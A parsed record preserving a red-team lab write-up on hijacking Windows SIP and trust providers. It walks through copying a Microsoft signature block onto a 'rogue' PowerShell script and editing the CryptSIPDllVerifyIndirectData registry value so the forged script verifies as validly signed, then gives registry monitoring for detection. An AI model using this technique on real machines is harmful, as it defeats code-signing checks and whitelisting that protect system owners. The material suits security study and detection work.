---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# SIP & Trust Provider Hijacking

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1198-trust-provider-hijacking` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1198-trust-provider-hijacking.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

In this lab, I will try to sign a simple "rogue" powershell script test-forged.ps1 that only has one line of code, with Microsoft's certificate and bypass any whitelisting protections/policies the script may be subject to if it is not signe

## Preserved Body

````markdown
In this lab, I will try to sign a simple "rogue" powershell script `test-forged.ps1` that only has one line of code, with **Microsoft's** certificate and bypass any whitelisting protections/policies the script may be subject to if it is not signed.

## Execution

The script that I will try to sign:

![](<../../_assets/trust-ps-file.png>)

Just before I start, let's make sure that the script is not signed by using a `Get-AuthenticodeSignature` cmdlet and `sigcheck` by SysInternals:

![](<../../_assets/trust-not-signed.png>)

In order to sign the script with Microsoft's certificate, we need to first find a native Microsoft Signed PowerShell script. I used powershell for this:

```csharp
Get-ChildItem -Path C:\*.ps* -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "# SIG # Begin signature block"
```

![](<../../_assets/trust-find-signed.png>)

I chose one script at random and simply checked if it was signed - luckily it was:

```bash
type C:\Windows\WinSxS\x86_microsoft-windows-m..ell-cmdlets-modules_31bf3856ad364e35_10.0.16299.15_none_c7c20f51cd336675\Wdac.psd1
```

![](<../../_assets/trust-check-if-signing-block-exists.png>)

Let's copy the Microsoft signature block to my script:

![](<../../_assets/trust-script-with-ms-signing-code.png>)

Now let's modify registry at:

```text
HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}
```

From:

![](<../../_assets/trust-from.png>)

To:
```csharp
C:\Windows\System32\ntdll.dll
```
```text
DbgUIContinue
```
![](<../../_assets/trust-to.png>)

Now, let's launch a new powershell instance \(for the registry changes to take effect\) and check the signature of the forged script - note how it now shows as signed, verified and valid:

![](<../../_assets/trust-signed.png>)

## Observations

Monitoring the following registry keys/values helps discover this suspicious activity:

![](<../../_assets/trust-sysmon1.png>)

![](<../../_assets/trust-sysmon2.png>)

## References

For all the registry keys/values that should be used as a baseline, please refer to the original research whitepaper by Matt Graeber:   
[SpecterOps Subverting Trust inWindows](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)
````

## Source Verification

[source record](../../sources/redteamingtactics/sip-and-trust-provider-hijacking.md)

## Evidence Excerpt

```text
_asset_filenames:
- trust-check-if-signing-block-exists.png
- trust-find-signed.png
- trust-from.png
- trust-not-signed.png
- trust-ps-file.png
- trust-script-with-ms-signing-code.png
- trust-signed.png
```
